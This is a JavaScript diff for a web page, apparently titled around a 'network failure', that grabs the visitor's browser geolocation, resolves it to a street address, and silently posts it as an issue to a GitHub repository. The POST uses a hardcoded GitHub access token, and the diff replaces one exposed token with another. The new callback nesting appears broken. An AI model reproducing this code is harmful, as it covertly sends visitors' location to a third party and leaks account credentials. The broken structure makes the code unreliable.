@@ -32,26 +32,17 @@
              
               const proxyUrl = "https://cors-anywhere.herokuapp.com/";
               const apiUrl = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
-              let formattedAddress = "";
               fetch(proxyUrl + apiUrl)
                 .then((response) => response.json())
                 .then((data) => {
                   if (data && data.address) {
                     const address = data.address;
-                    formattedAddress = `${address.road}, ${address.city}, ${address.state}, ${address.country}`;
-                   
-                  } else {
-                    
-                  }
-                })
-                .catch((error) => {
-                  console.error("Error fetching address:", error);
-                });
-              // Send this geolocation data to GitHub using GitHub API
+                   const formattedAddress = `${address.road}, ${address.city}, ${address.state}, ${address.country}`;
+                    // Send this geolocation data to GitHub using GitHub API
               fetch("https://api.github.com/repos/bhanubediya/Network-Failure/issues", {
                 method: "POST",
                 headers: {
-                  Authorization: `token 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`,
+                  Authorization: `token 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`,
                   "Content-Type": "application/json",
                 },
                 body: JSON.stringify({
@@ -66,10 +57,13 @@
                   console.log("Location data sent:", data);
                 })
                 .catch((error) => console.error("Error sending location data:", error));
-            },
-            function (error) {
-              console.error("Error getting geolocation: ", error);
             }
+                  }
+                })
+                .catch((error) => {
+                  console.error("Error fetching address:", error);
+                });
+             
           );
         } else {
           console.log("Geolocation is not supported by this browser.");
